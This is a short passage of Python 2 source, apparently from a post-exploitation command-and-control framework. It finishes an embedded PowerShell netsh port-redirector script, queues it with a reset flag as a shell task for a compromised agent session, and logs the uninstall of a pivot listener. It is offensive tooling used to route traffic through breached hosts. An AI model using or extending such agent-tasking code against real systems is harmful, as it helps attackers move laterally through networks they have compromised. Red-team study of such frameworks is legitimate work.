                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                                }
                            }
                            else{
                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                            }
                        }
                    }
                }
                Invoke-Redirector"""

                    script += " -Reset"

                    self.mainMenu.agents.add_agent_task_db(sessionID, "TASK_SHELL", script)
                    msg = "Tasked agent to uninstall Pivot listener "
                    self.mainMenu.agents.save_agent_log(sessionID, msg)



                elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):

                    print helpers.color("[!] Shutdown not implemented for python")

            else:
                print helpers.color("[!] Agent is not present in the cache or not elevated")

        pass
